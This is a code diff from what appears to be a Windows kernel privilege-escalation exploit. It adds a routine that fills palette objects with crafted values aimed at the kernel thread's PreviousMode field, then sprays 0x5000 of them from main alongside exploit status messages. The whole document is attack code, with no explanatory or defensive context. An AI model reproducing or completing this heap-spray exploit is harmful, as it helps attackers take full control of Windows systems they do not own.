@@ -259,7 +259,20 @@ BOOL InitEnvironment() {
 
     return TRUE;
 }
+HPALETTE createPaletteOfSize(int size) {
+    int pal_cnt = (size + 0x8c - 0x90) / 4;
+    int palsz = sizeof(LOGPALETTE) + sizeof(PALETTEENTRY) * (pal_cnt - 1);
+    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsz);
+    DWORD64* p = (DWORD64*)((DWORD)lPalette + 4);
 
+    p[0] = (DWORD64)0xffffffff;
+    p[3] = (DWORD64)0x04;
+    p[9] = g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset - 9 - 8;
+    lPalette->palNumEntries = pal_cnt;
+    lPalette->palVersion = 0x300;
+   
+    return CreatePalette(lPalette);
+}
 int main(int argc, TCHAR* argv[])
 {
     if (!InitEnvironment()) {
@@ -375,6 +388,10 @@ int main(int argc, TCHAR* argv[])
     }
     printf("[+] Release Resource Tracker1\n");
 
+    for (size_t i = 0; i < 0x5000; i++)
+    {
+        createPaletteOfSize(g_pExploitCtx->ObjectSize);
+    }
 
       
 }
